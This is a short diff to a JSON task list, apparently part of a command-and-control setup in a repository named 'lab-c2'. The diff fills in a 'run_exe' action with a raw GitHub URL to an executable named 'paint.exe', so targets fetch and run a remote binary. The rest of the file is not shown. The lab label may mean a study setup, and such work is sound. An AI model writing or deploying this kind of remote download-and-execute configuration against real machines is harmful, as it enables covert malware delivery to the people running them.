@@ -11,7 +11,8 @@
     },
     {
       "action": "run_exe",
-      "url": "PASTE_YOUR_RAW_GITHUB_PAINT_EXE_URL_HERE"
+      "url": "https://github.com/g00glecenter101-arch/lab-c2/raw/refs/heads/main/paint.exe"
     }
   ]
+
 }
